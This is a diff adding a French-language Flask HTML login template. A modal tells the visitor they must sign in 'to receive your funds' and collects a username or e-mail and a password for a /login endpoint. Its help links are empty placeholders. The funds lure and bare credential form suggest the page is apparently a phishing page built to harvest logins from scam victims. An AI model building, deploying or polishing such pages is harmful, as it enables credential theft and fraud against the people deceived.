@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Se connecter</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2 url("{{ url_for('static', filename='img/background.jpg') }}") no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal {
+      background-color: white;
+      width: 90%;
+      max-width: 360px;
+      padding: 30px 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    p {
+      text-align: center;
+      font-weight: bold;
+      font-size: 16px;
+      margin-bottom: 15px;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #007b76;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #005e59;
+    }
+
+    .links {
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .links a {
+      font-size: 13px;
+      color: #007b76;
+      text-decoration: none;
+      display: block;
+      margin-top: 5px;
+    }
+
+    /* Responsive adjustment for very small screens */
+    @media (max-width: 400px) {
+      .modal {
+        padding: 20px 15px;
+      }
+
+      input, button {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <p>Vous devez vous authentifier afin de recevoir vos fonds</p>
+    <h2>Se connecter</h2>
+    <form action="/login" method="post">
+      <input type="text" name="username" placeholder="E-mail ou nom d'utilisateur" required autocomplete="username">
+      <input type="password" name="password" placeholder="Mot de passe" required autocomplete="current-password">
+      <button type="submit">Continuer</button>
+    </form>
+    <div class="links">
+      <a href="#">Mot de passe oublié ?</a>
+      <a href="#">Vous rencontrez des problèmes ?</a>
+    </div>
+  </div>
+</body>
+</html>
